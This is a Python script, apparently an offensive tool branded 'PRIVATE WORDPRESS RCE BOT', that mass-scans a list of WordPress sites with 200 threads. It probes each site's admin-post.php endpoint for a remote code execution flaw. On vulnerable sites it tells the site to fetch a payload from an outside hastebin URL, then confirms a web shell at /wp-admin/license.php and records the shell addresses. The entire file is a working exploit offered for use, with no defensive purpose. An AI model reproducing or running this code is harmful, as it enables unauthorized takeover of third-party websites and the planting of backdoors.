#!/usr/bin/python
import requests, re, os, sys, codecs, random
from multiprocessing.dummy import Pool
from time import time as timer
import time
from urllib.parse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from importlib import reload

ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[33m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m'

ooo = []  # Define ooo as an empty list by default

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IndexError:
    print (ktnred + '[+]================> ' + 'USAGE: '+sys.argv[0]+' listsite.txt' + CEND)

ooo = list((ooo))

def uploadrce(url):
    try:
        upload = url + '/wp-admin/admin-post.php?Legion=id&swp_debug=load_options&swp_url=https://hastebin.com/raw/iropememif'
        Agent2 = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        se2 = requests.session()
        ktn3 = se2.get(upload, headers=Agent2, verify=False, timeout=10)
        check = url + '/wp-admin/license.php'
        ktn4 = se2.get(check, headers=Agent2, verify=False, timeout=10)
        if 'kill_the_net' in str(ktn4.content):
            print(ktn3yell + 'SHELL UPLOADED ====> [' + check + ']' + CEND)
            with open('shells_rce.txt', 'a') as file:
                file.write(check+'\n')
    except:
        pass

def rce_check(url):
    try:
        payload = url + '/wp-admin/admin-post.php?Legion=id&swp_debug=load_options&swp_url='
        Agent1 = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        se1 = requests.session()
        ktn2 = se1.get(payload, headers=Agent1, verify=False, timeout=10)
        if 'nothing found' in str(ktn2.content):
            print (ktn4blue + 'SITE VULN [' + url + ']' + CEND)
            with open('rcewp.txt', 'a') as file:
                file.write(url+'\n')
            uploadrce(url)
    except:
        pass

def check(url):
    try:
        Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        se = requests.session()
        ktn1 = se.get(url, headers=Agent, verify=False, timeout=10)
        if ktn1.status_code == 200:
            print (ktngreen + 'SEARCHING FOR VULN ..... [' + url + ']' + CEND)
            rce_check(url)
    except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as a:
        print (ktnred + 'TIME OUT: ' + url + CEND)
        check(url)
    except requests.exceptions.ConnectionError as b:
        print (ktnred + 'DEAD SITE2: ' + url + CEND)
        pass

def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
    x = ''' 
         FEDERATION BLACK HAT SYSTEM | IG: @_gghost666_ 
               Note! : PRIVATE WORDPRESS RCE BOT '''

    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

logo()

def Main():
    try:
        start = timer()
        ThreadPool = Pool(200)
        Threads = ThreadPool.map(check, ooo)
        print('TIME TAKE: ' + str(timer() - start) + ' S')
    except:
        pass


if __name__ == '__main__':
    Main()
